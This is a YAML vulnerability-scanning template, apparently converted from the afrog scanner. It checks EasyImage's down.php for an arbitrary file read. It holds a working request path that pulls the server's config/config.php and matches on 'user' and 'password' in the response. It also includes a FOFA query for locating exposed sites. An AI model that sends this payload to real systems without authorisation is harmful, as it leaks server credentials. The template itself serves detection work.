# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '''user'''
          - '''password'''
          - '''mime'''
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/application/down.php?dw=./config/config.php'
id: easyimage-download-anyread
info:
  author: zan8in
  description: |-
    EasyImage down.php 文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器任意文件
    fofa: app="EasyImage-简单图床"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: EasyImage down.php 任意文件读取漏洞
  severity: high
  tags: easyimage,fileread,argus-import
